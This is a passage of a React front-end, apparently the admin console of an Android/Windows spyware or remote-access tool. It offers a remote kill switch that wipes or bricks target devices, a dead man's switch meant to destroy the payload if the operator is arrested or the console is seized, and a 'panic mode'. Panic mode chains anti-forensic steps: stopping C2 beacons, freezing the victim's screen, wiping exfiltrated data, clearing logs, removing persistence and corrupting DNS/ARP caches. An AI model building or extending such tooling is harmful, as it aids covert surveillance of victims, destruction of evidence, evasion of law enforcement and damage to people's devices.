                        className="w-full py-2 text-[10px] border border-red-500/60 text-red-400 rounded hover:bg-red-950/30 transition-all disabled:opacity-40 tracking-widest animate-pulse font-bold">
                        {loading === "kill" ? "DESTROYING…" : "💀 EXECUTE KILL SWITCH"}
                      </button>
                    )}
                  </div>

                  <div className="border border-red-900/10 rounded p-3 text-[7px] text-red-900/50">
                    ⚠ Kill switch sends remote wipe commands to the target device. Actions marked IRREVERSIBLE
                    cannot be undone. Brick Mode causes device hardware damage requiring reflash.
                    Use only if trace detection confirms imminent forensic analysis.
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* ══════════════════════════════════
              DEAD MAN'S SWITCH
          ══════════════════════════════════ */}
          {tab === "deadman" && (
            <div>
              <h2 className="text-[11px] tracking-widest text-yellow-400 mb-2">DEAD MAN&apos;S SWITCH</h2>
              <p className="text-[8px] text-green-900/50 mb-5">
                If the admin console goes dark for N hours with no heartbeat — payload automatically destructs.
                Protects against seizure of this machine, imprisonment, or network takedown.
              </p>

              <div className="grid grid-cols-2 gap-6">
                <div>
                  <div className="text-[9px] text-green-700 tracking-widest mb-3">TRIGGER CONDITIONS</div>
                  <div className="space-y-3 mb-4">
                    <div>
                      <label className="block text-[8px] text-green-900/40 mb-1">
                        Hours without heartbeat before trigger: <span className="text-yellow-400">{deadManHours}h</span>
                      </label>
                      <input type="range" min="1" max="168" value={deadManHours}
                        onChange={(e) => setDeadManHours(parseInt(e.target.value))}
                        className="w-full accent-yellow-500" />
                      <div className="flex justify-between text-[7px] text-green-900/30 mt-0.5">
                        <span>1h (aggressive)</span>
                        <span>168h = 7 days (lenient)</span>
                      </div>
                    </div>

                    <div className="grid grid-cols-3 gap-2">
                      {[6, 12, 24, 48, 72, 168].map((h) => (
                        <button key={h} onClick={() => setDeadManHours(h)}
                          className={`py-1.5 text-[8px] border rounded transition-all ${
                            deadManHours === h ? "border-yellow-700/50 text-yellow-400 bg-yellow-950/20" : "border-green-900/20 text-green-800 hover:border-green-800/30"
                          }`}>{h}h</button>
                      ))}
                    </div>
                  </div>

                  <div className="text-[9px] text-green-700 tracking-widest mb-3">DESTRUCT ON TRIGGER</div>
                  <div className="space-y-1.5 mb-4">
                    {DESTRUCT_ACTIONS.slice(0, 5).map((a) => {
                      const on = selectedDestruct.has(a.id);
                      return (
                        <div key={a.id} className={`flex items-center gap-2 p-2 border rounded text-[8px] ${on ? "border-yellow-900/30 text-yellow-600" : "border-green-900/10 text-green-900/30"}`}>
                          <input type="checkbox" checked={on}
                            onChange={() => setSelectedDestruct((prev) => {
                              const next = new Set(prev);
                              if (next.has(a.id)) next.delete(a.id); else next.add(a.id);
                              return next;
                            })} className="accent-yellow-500" />
                          {a.label}
                        </div>
                      );
                    })}
                  </div>
                </div>

                <div>
                  <div className="text-[9px] text-green-700 tracking-widest mb-3">HEARTBEAT SESSIONS</div>
                  {heartbeats.length === 0 ? (
                    <div className="text-[8px] text-green-900/30 p-3 border border-green-900/10 rounded">
                      No heartbeat sessions configured. Arm the dead man&apos;s switch to start monitoring.
                    </div>
                  ) : heartbeats.map((hb) => (
                    <div key={hb.sessionId} className="border border-yellow-900/20 rounded p-3 mb-2">
                      <div className="flex justify-between text-[8px] mb-1">
                        <span className="text-yellow-400">Session #{hb.sessionId}</span>
                        <span className={hb.traceDetected ? "text-red-500" : "text-green-700"}>
                          {hb.traceDetected ? "⚠ TRACE DETECTED" : "✓ CLEAN"}
                        </span>
                      </div>
                      <div className="text-[7px] text-green-900/40">Last seen: {hb.lastSeen}</div>
                      <div className="text-[7px] text-green-900/40">Auto-destruct in: {hb.armedDestructHours}h</div>
                    </div>
                  ))}

                  <div className="space-y-2 mt-3">
                    <button onClick={armDeadMan} disabled={!!loading || !session}
                      className={`w-full py-2 text-[9px] border rounded transition-all disabled:opacity-40 tracking-widest ${
                        deadManArmed ? "border-yellow-700/60 bg-yellow-950/20 text-yellow-400" : "border-yellow-900/30 text-yellow-700 hover:border-yellow-700/40"
                      }`}>
                      {loading === "deadman" ? "ARMING…" : deadManArmed ? `⏳ ARMED — ${deadManHours}h TRIGGER` : "▶ ARM DEAD MAN'S SWITCH"}
                    </button>
                    {deadManArmed && (
                      <button onClick={() => { setDeadManArmed(false); addLog("Dead man's switch disarmed", "warn"); }}
                        className="w-full py-1.5 text-[8px] border border-green-900/20 text-green-900/40 rounded hover:text-green-700 transition-all">
                        DISARM
                      </button>
                    )}
                  </div>

                  <div className="mt-4 border border-yellow-900/10 rounded p-3 text-[7px] text-yellow-900/40 space-y-1">
                    <div className="text-yellow-800 mb-1">How it works:</div>
                    <div>• Admin console sends a heartbeat ping every 30 minutes to each session</div>
                    <div>• If ping fails for {deadManHours}h → payload receives self-destruct command</div>
                    <div>• Payload wipes itself without requiring admin action</div>
                    <div>• Protects against: admin arrest, hardware seizure, network takedown, extended unavailability</div>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* ══════════════════════════════════
              PANIC MODE
          ══════════════════════════════════ */}
          {tab === "panic" && (
            <div>
              <div className="text-center py-4">
                <div className="text-[9px] text-red-500 tracking-widest mb-1 animate-pulse">⚠ PANIC MODE</div>
                <h2 className="text-[14px] tracking-widest text-red-400 mb-2">EMERGENCY RESPONSE</h2>
                <p className="text-[8px] text-green-900/50 mb-6 max-w-lg mx-auto">
                  One button activates ALL counter-measures simultaneously:
                  C2 masking → stop beacons → freeze target device → wipe payload data →
                  uninstall → clear system logs → cover tracks. Use when compromise is imminent.
                </p>
              </div>

              <div className="max-w-xl mx-auto">
                {/* What happens */}
                <div className="border border-red-900/20 rounded p-4 mb-5">
                  <div className="text-[9px] text-red-600 tracking-widest mb-3">PANIC MODE EXECUTES IN ORDER</div>
                  <div className="space-y-2">
                    {[
                      { n: "01", title: "C2 Traffic Stop",       desc: "Immediately cease all beaconing. Drop all active connections." },
                      { n: "02", title: "Freeze Target Device",   desc: "Lock screen, disable touch input, black out display — device appears off." },
                      { n: "03", title: "Stop Trace Detection",   desc: "Kill network monitoring bypass — reduce footprint." },
                      { n: "04", title: "Wipe Exfiltrated Data",  desc: "Secure-delete all captured files, recordings, screenshots on device." },
                      { n: "05", title: "Wipe Payload Files",     desc: "Delete APK cache, DEX, data files. 7-pass DoD overwrite." },
                      { n: "06", title: "Clear System Logs",      desc: "Android: logcat. Windows: Event Viewer, PS history, prefetch." },
                      { n: "07", title: "Kill Persistence",       desc: "Remove BOOT_COMPLETED, Run keys, scheduled tasks, WMI subs." },
                      { n: "08", title: "Force Uninstall",        desc: "pm uninstall / msiexec /x — remove all traces of app." },
                      { n: "09", title: "Cover Network Tracks",   desc: "Corrupt local DNS cache, ARP table. Scramble connection logs." },
                      { n: "10", title: "Admin Console Lockdown", desc: "Clear browser cookies, session tokens, rotate all API keys." },
                    ].map(({ n, title, desc }) => (
                      <div key={n} className="flex gap-3 text-[8px]">
                        <div className="w-6 h-6 rounded border border-red-900/30 flex items-center justify-center text-[7px] text-red-700 shrink-0">{n}</div>
                        <div>
                          <div className="text-red-400">{title}</div>
                          <div className="text-green-900/40">{desc}</div>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>

                {/* Execute button */}
                {!session ? (
                  <div className="text-center text-[8px] text-green-900/30 py-4">No session selected</div>
                ) : (
                  <button onClick={executePanic} disabled={!!loading}
                    className="w-full py-4 text-[12px] font-bold border-2 border-red-500/60 text-red-400 rounded hover:bg-red-950/30 transition-all disabled:opacity-40 tracking-widest animate-pulse">
                    {loading === "panic" ? "⚙ EXECUTING PANIC MODE…" : "🚨 ACTIVATE PANIC MODE — SESSION #" + session.id}
                  </button>
                )}

                <div className="mt-3 text-center text-[7px] text-red-900/40">
                  THIS IS IRREVERSIBLE. ALL PAYLOAD DATA AND EVIDENCE WILL BE PERMANENTLY DESTROYED.
                </div>
              </div>
            </div>
          )}

          {/* ══════════════════════════════════
              EVENT LOG
          ══════════════════════════════════ */}
          {tab === "log" && (
            <div>
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-[11px] tracking-widest text-green-400">COUNTER-INTEL EVENT LOG</h2>
                <button onClick={() => setLog([])} className="text-[8px] text-green-900/40 hover:text-green-700 transition-all">CLEAR</button>
              </div>
              <div className="space-y-0.5">
                {log.length === 0 ? (
                  <div className="text-[8px] text-green-900/20 py-8 text-center">No events recorded yet</div>
                ) : log.map((l, i) => (
                  <div key={i} className={`flex gap-3 text-[8px] py-1 border-b border-green-900/5 ${
                    l.type === "critical" ? "text-red-400" :
                    l.type === "err"      ? "text-red-700" :
                    l.type === "warn"     ? "text-yellow-600" :
                    l.type === "ok"       ? "text-green-500" : "text-green-800"
                  }`}>
                    <span className="text-green-900/30 shrink-0">[{l.t}]</span>
                    <span>{l.msg}</span>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>

        {/* ── STATUS BAR ── */}
        <div className="h-8 border-t border-green-900/20 bg-black/40 flex items-center gap-6 px-4">
          <div className={`flex items-center gap-1.5 text-[7px] ${traceResult?.c2_trace_risk === "CRITICAL" ? "text-red-500 animate-pulse" : "text-green-900/30"}`}>
            <div className={`w-1 h-1 rounded-full ${traceResult?.c2_trace_risk === "CRITICAL" ? "bg-red-500" : "bg-green-900/20"}`} />
            TRACE: {traceResult?.c2_trace_risk ?? "NOT SCANNED"}
          </div>
          <div className={`flex items-center gap-1.5 text-[7px] ${maskConfig ? "text-violet-500" : "text-green-900/30"}`}>
            <div className={`w-1 h-1 rounded-full ${maskConfig ? "bg-violet-500" : "bg-green-900/20"}`} />
            C2 MASK: {maskConfig ? maskConfig.mimicProfile.toUpperCase() : "NONE"}
          </div>
          <div className={`flex items-center gap-1.5 text-[7px] ${deadManArmed ? "text-yellow-500" : "text-green-900/30"}`}>
            <div className={`w-1 h-1 rounded-full ${deadManArmed ? "bg-yellow-500 animate-pulse" : "bg-green-900/20"}`} />
            DEAD MAN: {deadManArmed ? `ARMED ${deadManHours}H` : "OFF"}
          </div>
          <div className={`flex items-center gap-1.5 text-[7px] ${autoMonitor ? "text-cyan-500" : "text-green-900/30"}`}>
            <div className={`w-1 h-1 rounded-full ${autoMonitor ? "bg-cyan-500 animate-pulse" : "bg-green-900/20"}`} />
            AUTO-MONITOR: {autoMonitor ? "ON (30s)" : "OFF"}
          </div>
          <div className="ml-auto text-[7px] text-green-900/30">{log.length} events</div>
        </div>
      </div>
    </div>
  );
}
